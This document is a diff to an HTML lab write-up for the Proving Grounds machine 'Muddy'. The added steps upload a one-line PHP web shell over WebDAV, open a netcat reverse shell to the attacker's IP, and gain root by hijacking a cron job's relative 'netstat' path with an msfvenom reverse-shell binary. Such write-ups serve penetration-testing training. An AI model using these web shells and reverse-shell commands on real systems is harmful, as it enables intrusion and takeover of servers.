@@ -239,9 +239,99 @@ xmlns:urn=\&quot;urn:checkout\&quot;&gt;&lt;soapenv:Header/&gt;
     <img src="Muddy/hashcat.png">
 
 
-    <li>I crack the hash with hashcat and it comes back with the password sleepless</li>
+    <li>I crack the hash with hashcat and it comes back with the password sleepless.  Now we have the webdav login username "administrant" and the password "sleepless".  We can use the tool cadaver to connect to webdav and upload a web shell.</li>
+
+    <li>Webshell contents:</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ cat shell.php                                                                                              255 &#x2a2f;
+&lt;?php system($_REQUEST[&#039;cmd&#039;]); ?&gt;
+    </pre>
+
+    <li>Connecting to webdav and uploading web shell.</li>
+
+    <pre>       
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ cadaver http://muddy.ugc/webdav
+Authentication required for Restricted Content on server `muddy.ugc&#039;:
+Username: administrant
+Password: 
+dav:/webdav/&gt; put shell.php
+Uploading shell.php to `/webdav/shell.php&#039;:
+Progress: [=============================&gt;] 100.0% of 35 bytes succeeded.
+    </pre>
+
+    <p>Now that we have our webshell uploaded we can access it by going to http://muddy.ugc/webdav and logging in with administrant:sleepless.  Once we login we get access to the page with out webshell, shell.php.  Now we can get our reverse shell using netcat.  I setup my reverse listener on port 80 and then sent this through my browser: http://muddy.ugc/webdav/shell.php?cmd=nc -nv 192.168.49.248 80 -e /bin/bash</p>
+
+    <li>Receiving reverse shell and upgrading the shell for pty, clear command, and autocomplete.</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ nc -lvnp 80
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::80
+Ncat: Listening on 0.0.0.0:80
+Ncat: Connection from 192.168.248.161.
+Ncat: Connection from 192.168.248.161:51630.
+python -c &quot;import pty;pty.spawn(&#039;/bin/bash&#039;);&quot;
+www-data@muddy:/var/www/html/webdav$ export TERM=xterm
+export TERM=xterm
+www-data@muddy:/var/www/html/webdav$ ^Z
+zsh: suspended  nc -lvnp 80
+                                                                                                                     
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Muddy/exfiltrated]
+&#x2514;&#x2500;$ stty raw -echo;fg;                                                                                     148 &#x2a2f; 1 &#x2699;
+[1]  + continued  nc -lvnp 80
+
+www-data@muddy:/var/www/html/webdav$ 
+    </pre>
 
 
+    <h2>Getting root</h2>
+
+    <li>Once we are on the box, one of the things we check is for cronjobs.  There turns out to be a cronjob we can exploit</li>
+
+    <pre>
+www-data@muddy:/dev/shm$ cat /etc/cron*
+cat: /etc/cron.d: Is a directory
+cat: /etc/cron.daily: Is a directory
+cat: /etc/cron.hourly: Is a directory
+cat: /etc/cron.monthly: Is a directory
+cat: /etc/cron.weekly: Is a directory
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don&#039;t have to run the `crontab&#039;
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*  *    * * *   root    netstat -tlpn &gt; /root/status &amp;&amp; service apache2 status &gt;&gt; /root/status &amp;&amp; service mysql status &gt;&gt; /root/status
+    </pre>
+
+    <p>The cronjob is calling for the program netstat without an absolute path.  So we look at the PATH variables and see if we can write to any of them.  /dev/shm is a directory that we can commonly write to as an unprivileged user.  So in order to exploit this, we will create a malicious executable named netstat and place it in this directory.  I use msfvenom to create this.</p>
+
+    <li>Creating malicious netstat</li>
+
+    <pre>
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.248 LPORT=80 -f elf -o netstat
+    </pre>
+
+    <p>Now I setup a web server on Kali using "python3 -m http.server 80" and then download the file to the victim using wget.  Once I place this file in /dev/shm I set the permissions so it is executable using "chmod +x /dev/shm/netstat".  After that I open a listener up on port 80 on Kali and wait.  Eventually I receive a root shell.</p>
 
 </body>
 </html>
